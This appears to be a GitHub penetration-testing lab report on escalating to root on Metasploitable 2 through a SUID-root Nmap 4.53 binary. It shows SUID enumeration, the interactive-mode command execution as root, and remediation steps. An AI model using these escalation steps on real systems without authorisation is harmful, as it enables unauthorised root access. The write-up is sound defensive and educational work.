# Penetration-testing-lab-002
Project 002: Network Enumeration &amp; Exploitation

# Project 002: Linux Privilege Escalation — SUID Enumeration, Nmap Misconfiguration, and Root-Level Command Execution

## Linux Privilege Escalation — SUID Nmap Misconfiguration

### 1. Objective

Identify and validate a Linux privilege escalation vulnerability within an intentionally vulnerable virtual machine.

The objective was to enumerate user permissions, identify potentially insecure SUID executables, and determine whether a low-privileged user could execute commands with elevated privileges.

All testing was conducted in an isolated, authorized home lab.

### 2. Lab Environment

| Component | Description |
|---|---|
| Host Operating System | Windows 11 |
| Virtualization | VMware Workstation |
| Attacker Machine | Kali Linux 2025.3 |
| Target Machine | Metasploitable 2 |
| Target Operating System | Ubuntu 8.04-based Linux |
| Kernel Version | 2.6.24-16-server |
| Target IP Address | 192.168.42.128 |
| Network Configuration | Host-only |
| Initial User Account | msfadmin |

### 3. Tools and Techniques

- Linux command-line utilities
- User and group enumeration
- Sudo permission enumeration
- SUID binary enumeration
- Nmap 4.53 interactive mode
- Linux file permission analysis

### 4. Methodology

**Step 1 — User Enumeration**

Identified the current user and associated group memberships.

```bash
whoami
id
```

The `msfadmin` account was identified with UID 1000, confirming that the initial session was not running as root.

**Step 2 — Sudo Permission Enumeration**

```bash
sudo -l
```

The output revealed:

```text
(ALL) ALL
```

The account was permitted to execute commands as other users, including root, through sudo.

The following command was used to validate administrative access:

```bash
sudo -i
```

Root access was verified using `whoami` and `id`. This demonstrated existing administrative authorization rather than a software exploit.

**Step 3 — Operating System Enumeration**

```bash
uname -a
```

The target was running Linux kernel version `2.6.24-16-server`.

**Step 4 — SUID Binary Enumeration**

Searched the filesystem for executables with the SUID permission bit enabled.

```bash
find / -type f -perm -4000 2>/dev/null
```

Multiple SUID executables were identified, including:

```text
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/nmap
/usr/bin/chsh
```

Nmap was selected for further investigation because it is a network scanning utility that does not ordinarily require unrestricted SUID-root execution.

**Step 5 — Nmap Permission and Version Analysis**

```bash
ls -l /usr/bin/nmap
nmap --version
file /usr/bin/nmap
```

The results confirmed:

```text
-rwsr-xr-x 1 root root ... /usr/bin/nmap
```

Installed version:

```text
Nmap version 4.53
```

The executable was owned by root and had the SUID bit enabled.

**Step 6 — Privilege Escalation Validation**

Launched Nmap's legacy interactive interface:

```bash
/usr/bin/nmap --interactive
```

Executed the following commands from the Nmap prompt:

```text
!whoami
!id
```

The output included:

```text
root

uid=1000(msfadmin) gid=1000(msfadmin) euid=0(root)
```

This confirmed that operating system commands executed through Nmap inherited root's effective user privileges.

### 5. Vulnerability Finding

**Finding 001 — SUID Nmap Privilege Escalation**

| Attribute | Details |
|---|---|
| Severity | High (Lab Assessment) |
| Affected Host | 192.168.42.128 |
| Affected Executable | /usr/bin/nmap |
| Software Version | Nmap 4.53 |
| Vulnerability Type | Insecure SUID Configuration |
| Access Required | Local user account |
| Result | Root-level effective command execution |
| Status | Validated |

**Description**

The target system contained a root-owned installation of Nmap 4.53 with the SUID permission bit enabled.

This version supports an interactive mode capable of executing operating system commands. Because the executable inherited root's effective privileges, a local user could execute commands with an effective UID of 0.

**Root Cause**

The vulnerability resulted from the combination of unnecessary SUID-root permissions and legacy software functionality that permitted arbitrary command execution.

**Security Impact**

A local user with access to the executable could execute operating system commands with root's effective privileges, potentially compromising system confidentiality, integrity, and availability.

The testing demonstrated elevated command execution but did not establish persistence or a persistent root shell.

### 6. Evidence

Add the screenshots collected during testing.

**Evidence 001 — User and Sudo Enumeration**


<img width="433" height="253" alt="001-user-enumeration" src="https://github.com/user-attachments/assets/b9845241-41a6-4a82-86fb-d92ff5ec5cea" />


**Evidence 002 — Sudo Privilege Validation**


<img width="412" height="234" alt="002-sudo-privilege-validation" src="https://github.com/user-attachments/assets/5fb4d206-654f-4949-890e-63ef7e446c3b" />


**Evidence 003 — SUID Enumeration**


<img width="365" height="244" alt="003-suid-enumeration" src="https://github.com/user-attachments/assets/03b136df-195e-4ba0-b565-8b17262ac86e" />


**Evidence 004 — Nmap Permissions and Version**



<img width="388" height="131" alt="004-nmap-permissions" src="https://github.com/user-attachments/assets/2a2dec80-8122-42f3-b3f0-506cf30d1c2e" />


**Evidence 005 — Nmap Privilege Escalation**


<img width="416" height="168" alt="005-nmap-exploitation" src="https://github.com/user-attachments/assets/9d050023-46fc-481e-869d-4ceba984c70d" />


### 7. Remediation Recommendations

1. **Remove unnecessary SUID permissions:** Remove the SUID bit from the Nmap executable.

   ```bash
   sudo chmod u-s /usr/bin/nmap
   ```

2. **Upgrade obsolete software:** Replace Nmap 4.53 with a supported version obtained from a trusted source.

3. **Apply least privilege:** Restrict administrative privileges and avoid granting unnecessary root-level execution permissions.

4. **Audit SUID executables:** Regularly identify and review executables with elevated permissions.

5. **Review sudo permissions:** Verify that accounts with unrestricted sudo access have a legitimate administrative requirement.

6. **Validate remediation:** Confirm that Nmap no longer has unnecessary SUID permissions and that ordinary users cannot execute arbitrary commands with root privileges through it.

### 8. Conclusion

This lab demonstrated how improper Linux file permissions combined with legacy application functionality can create a local privilege escalation vulnerability.

Starting with the low-privileged `msfadmin` account, SUID enumeration identified Nmap 4.53 as a potential security risk.

Further testing confirmed that Nmap's interactive functionality allowed operating system commands to execute with an effective UID of 0.

The exercise reinforced the importance of Linux privilege enumeration, validating suspected vulnerabilities, and documenting security findings with supporting evidence.

### 9. Skills Demonstrated

- Linux privilege enumeration
- User and group permission analysis
- Sudo configuration assessment
- SUID binary discovery
- Vulnerability validation
- Local privilege escalation testing
- Security impact analysis
- Remediation planning
- Technical security reporting

### Disclaimer

This project was performed exclusively in an isolated, intentionally vulnerable VMware lab for educational and authorized security testing purposes.
